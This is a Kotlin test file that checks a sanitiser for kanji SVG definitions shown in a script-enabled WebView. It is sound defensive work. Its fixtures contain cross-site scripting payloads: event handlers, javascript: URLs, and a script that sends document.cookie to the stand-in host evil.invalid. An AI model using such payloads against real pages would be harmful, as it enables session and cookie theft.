// SPDX-License-Identifier: GPL-3.0-or-later
package mihon.core.dictionary.ui

import io.kotest.matchers.shouldBe
import io.kotest.matchers.shouldNotBe
import io.kotest.matchers.string.shouldContain
import io.kotest.matchers.string.shouldNotContain
import kotlinx.serialization.json.Json
import kotlinx.serialization.json.jsonArray
import kotlinx.serialization.json.jsonObject
import kotlinx.serialization.json.jsonPrimitive
import mihon.core.dictionary.model.KanjiEntry
import mihon.core.dictionary.model.KanjiResult
import org.junit.jupiter.api.Test
import org.w3c.dom.Document
import org.w3c.dom.Element
import org.xml.sax.InputSource
import java.io.StringReader
import javax.xml.parsers.DocumentBuilderFactory

private const val SVG_NAMESPACE = "http://www.w3.org/2000/svg"
private const val XLINK_NAMESPACE = "http://www.w3.org/1999/xlink"

/**
 * Parses [markup] the way the renderer does: as a standalone XML document, namespace-aware, with no
 * external entity resolution. Throws (`unbound prefix`, wrong namespace, malformed markup) when the
 * sanitiser emitted something the renderer cannot import.
 */
private fun parseAsSvg(markup: String): Document {
    val factory = DocumentBuilderFactory.newInstance().apply {
        isNamespaceAware = true
        isExpandEntityReferences = false
        setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)
    }
    return factory.newDocumentBuilder().parse(InputSource(StringReader(markup)))
}

/**
 * Kanji definitions come from third-party dictionaries and are rendered as inline SVG inside a
 * JS-enabled WebView that carries native bridges, so the payload boundary must strip anything that
 * can execute. A normal glyph must survive untouched.
 */
class KanjiSvgSanitizationTest {

    @Test
    fun `kanji payload drops handlers and scripts but keeps the glyph path`() {
        val entry = KanjiEntry(
            dictName = "svg-dict",
            onyomi = "ブ",
            kunyomi = "",
            tags = "",
            definitions = listOf(
                """<svg viewBox="0 0 100 100" onload="alert('x')">""" +
                    """<script>fetch('https://evil.invalid/?d='+document.cookie)</script>""" +
                    """<path d="M0 0" fill="#000"/>""" +
                    """</svg>""",
            ),
            stats = mapOf("stroke count" to "8"),
        )

        val payload = buildKanjiEntryJsonStrings(KanjiResult("武", listOf(entry))).single()
        val definition = Json.parseToJsonElement(payload)
            .jsonObject["kanji"]!!.jsonObject["definitions"]!!.jsonArray[0].jsonPrimitive.content

        definition shouldContain """<path d="M0 0" fill="#000"/>"""
        definition shouldContain """viewBox="0 0 100 100""""
        definition shouldNotContain "onload"
        definition shouldNotContain "script"
        definition shouldNotContain "alert"
        definition shouldNotContain "evil.invalid"
    }

    @Test
    fun `a plain kanji glyph is emitted unchanged`() {
        val glyph = """<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">""" +
            """<g transform="translate(4 4)"><path d="M0 0 L10 10" fill="none" stroke="#000" """ +
            """stroke-width="4"/></g><text x="2" y="9" font-size="9">一</text></svg>"""

        sanitizeKanjiRichText(glyph) shouldBe glyph
    }

    @Test
    fun `markup that cannot be whitelisted loses the element with its subtree`() {
        val markup = """<svg viewBox="0 0 1 1">""" +
            """<foreignObject><div xmlns="http://www.w3.org/1999/xhtml">""" +
            """<img src="x" onerror="alert(1)"/></div></foreignObject>""" +
            """<style>rect{background:url(https://evil.invalid/a)}</style>""" +
            """<path d="M1 1" style="fill:url(javascript:alert(1))" onclick="alert(2)"/>""" +
            """</svg>"""

        val sanitized = sanitizeKanjiRichText(markup)

        // The root namespace is injected, so the glyph is a standalone SVG document.
        sanitized shouldBe """<svg viewBox="0 0 1 1" xmlns="http://www.w3.org/2000/svg">""" +
            """<path d="M1 1"/></svg>"""
    }

    @Test
    fun `a definition that is not svg is left alone`() {
        val definition = "a <b>bold</b> meaning with &#x27;quotes&#x27;"

        sanitizeKanjiRichText(definition) shouldBe definition
    }

    @Test
    fun `an external href is reduced to a local reference or dropped`() {
        sanitizeKanjiSvgMarkup("""<svg><use href="https://evil.invalid/a.svg#x"/></svg>""") shouldBe
            """<svg xmlns="http://www.w3.org/2000/svg"><use/></svg>"""
        sanitizeKanjiSvgMarkup("""<svg><use href="#glyph"/></svg>""") shouldBe
            """<svg xmlns="http://www.w3.org/2000/svg"><use href="#glyph"/></svg>"""
    }

    @Test
    fun `an xlink reference keeps a matching namespace declaration`() {
        val sanitized = sanitizeKanjiSvgMarkup("""<svg><use xlink:href="#g"/></svg>""")

        sanitized shouldContain """xlink:href="#g""""
        sanitized shouldContain """xmlns:xlink="$XLINK_NAMESPACE""""
        // Without both declarations this is an `unbound prefix` XML parse error, not a glyph.
        val document = parseAsSvg(sanitized)
        document.documentElement.namespaceURI shouldBe SVG_NAMESPACE
        val use = document.getElementsByTagNameNS(SVG_NAMESPACE, "use").item(0) as Element
        use.getAttributeNS(XLINK_NAMESPACE, "href") shouldBe "#g"
    }

    @Test
    fun `a namespace declaration the dictionary already made is preserved`() {
        sanitizeKanjiSvgMarkup(
            """<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="$XLINK_NAMESPACE">""" +
                """<use xlink:href="#g"/></svg>""",
        ) shouldBe
            """<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="$XLINK_NAMESPACE">""" +
            """<use xlink:href="#g"/></svg>"""
    }

    @Test
    fun `a root without a namespace declaration gets the svg one`() {
        val sanitized = sanitizeKanjiSvgMarkup("""<svg><use href="#glyph"/></svg>""")

        sanitized shouldBe """<svg xmlns="http://www.w3.org/2000/svg"><use href="#glyph"/></svg>"""
        parseAsSvg(sanitized).documentElement.namespaceURI shouldBe SVG_NAMESPACE
    }

    @Test
    fun `xml space survives and style stays refused`() {
        val sanitized = sanitizeKanjiSvgMarkup(
            """<svg><text xml:space="preserve" style="fill:red">一</text></svg>""",
        )

        sanitized shouldContain """xml:space="preserve""""
        sanitized shouldNotContain "style="
    }

    @Test
    fun `every sanitised glyph fixture parses as standalone svg`() {
        val fixtures = listOf(
            """<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">""" +
                """<g transform="translate(4 4)"><path d="M0 0 L10 10" fill="none" stroke="#000" """ +
                """stroke-width="4"/></g></svg>""",
            """<svg viewBox="0 0 100 100" onload="alert('x')">""" +
                """<script>fetch('https://evil.invalid/?d='+document.cookie)</script>""" +
                """<path d="M0 0" fill="#000"/></svg>""",
            """<svg><use xlink:href="#g"/></svg>""",
            """<svg><use href="#glyph"/></svg>""",
            """<svg viewBox="0 0 1 1"><foreignObject><div><img src="x"/></div></foreignObject>""" +
                """<style>rect{background:url(https://evil.invalid/a)}</style>""" +
                """<path d="M1 1" style="fill:red" onclick="alert(2)"/></svg>""",
            """<svg><defs><linearGradient id="g"><stop offset="0" stop-color="#fff"/></linearGradient>""" +
                """</defs><rect fill="url(#g)" width="1" height="1"/></svg>""",
        )

        for (fixture in fixtures) {
            val sanitized = sanitizeKanjiRichText(fixture)
            withClue(fixture, sanitized) {
                val document = parseAsSvg(sanitized)
                document.documentElement.namespaceURI shouldBe SVG_NAMESPACE
                document.documentElement.localName shouldBe "svg"
            }
        }
    }

    private fun <T> withClue(fixture: String, sanitized: String, block: () -> T): T =
        try {
            block()
        } catch (failure: Exception) {
            throw AssertionError("failed for $fixture -> $sanitized", failure)
        }

    @Test
    fun `markup without an svg root is returned as inert text`() {
        val sanitized = sanitizeKanjiSvgMarkup("""<g onload="alert(1)"><path d="M0 0"/></g>""")

        sanitized shouldContain "&lt;g"
        sanitized shouldNotContain "<g "
        sanitized shouldNotBe """<g onload="alert(1)"><path d="M0 0"/></g>"""
    }
}
